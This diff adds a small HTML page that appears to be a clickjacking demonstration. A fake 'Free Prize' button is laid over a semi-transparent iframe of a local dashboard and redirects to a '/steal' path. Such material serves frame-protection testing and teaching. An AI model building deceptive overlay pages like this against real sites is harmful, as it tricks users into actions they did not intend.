@@ -1,0 +1,39 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Free Prize!</title>
+    <style>
+        body { font-family: Arial, sans-serif; }
+        #prize-button {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            padding: 15px 30px;
+            background: #ff0000;
+            color: white;
+            border: none;
+            cursor: pointer;
+            z-index: 9999;
+        }
+        iframe {
+            width: 100%;
+            height: 100vh;
+            opacity: 0.5;
+            border: none;
+        }
+    </style>
+</head>
+<body>
+    <h1>🎉 Claim Your Free Prize! 🎉</h1>
+    <p>Click the button below to win!</p>
+
+    <!-- Legitimate site loaded in iframe -->
+    <iframe src="http://localhost:3000/dashboard"></iframe>
+
+    <!-- Fake button overlayed on top -->
+    <button id="prize-button" onclick="window.location.href='/steal'">
+        CLICK HERE TO WIN $1000!
+    </button>
+</body>
+</html>
